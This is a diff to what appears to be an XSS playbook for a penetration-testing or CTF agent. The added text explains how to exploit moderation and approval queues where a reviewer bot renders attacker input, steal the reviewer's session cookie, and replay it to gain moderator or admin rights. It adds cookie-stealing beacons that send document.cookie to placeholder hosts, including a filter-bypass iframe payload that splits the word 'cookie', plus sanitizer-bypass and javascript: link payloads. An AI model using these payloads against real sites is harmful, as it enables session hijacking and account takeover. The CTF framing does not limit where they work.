@@ -29,6 +29,17 @@ When you plant a blind/stored XSS beacon, append a row to `targets/<eng>/oob.md`
 ## Attack Surface Signals
 High-value: admin panels (`*/admin`, `*/settings`), payment flows, stored wikis/labels/tags, SSO/signin pages, SVG upload endpoints.
 
+**Approval / moderation workflow = the classic stored-XSS-to-privilege-escalation sink. Recognize it.**
+When your submission "awaits review/approval by a moderator/admin" AND any field you control is rendered
+back in a privileged panel (a pending-registrations queue, a report/ticket viewer, a comment-moderation
+list, an order-approval screen), there is almost always a headless **reviewer bot** that opens that panel.
+That is a blind-XSS delivery you get for free: plant a cookie/session beacon in the field and the reviewer's
+session is exfiltrated -> replay their cookie -> you ARE the moderator/admin. The tell is often visible while
+authed as a lower role or as admin: if the panel shows a prior submission's raw markup (an unescaped username
+like `<x>` or `sqltest'...` sitting literally in the table), the sink is confirmed *without even firing a
+payload* -- that raw reflection IS the stored-XSS proof, do not walk past it. This is frequently the INTENDED
+path to the mid-tier (moderator) flag/role on a box that also has a heavier unintended route (LFI/RCE).
+
 DOM XSS signals in JS:
 ```javascript
 document.write(  innerHTML =  location.hash  location.search
@@ -63,8 +74,13 @@ aaa"bbb'ccc<ddd>eee`fff
 <!-- Sanitizer bypass -->
 <math><style><img src=x onerror=alert(1)></style></math>
 
-<!-- Blind-XSS beacon -->
+<!-- Blind-XSS beacon (into a reviewer/approval field) -->
 <svg onload=fetch('//bxss-<tag>.<collab>/x?c='+document.cookie)>
+
+<!-- Filter-bypass beacon: word "cookie" blocked / <script>,<img> filtered / entity-encoded.
+     Concatenate the property name + use iframe onload; exfil via new Image() (no fetch needed). -->
+<iframe onload="new Image().src='//<lhost>:<port>/?x='+document['coo'+'kie']">
+<!-- other separators when on\w+= is regex-filtered: <svg%0conload=...> (form feed), <svg/onload=...> -->
 
 <!-- Markdown -->
 [Click](javascript:alert(document.domain))
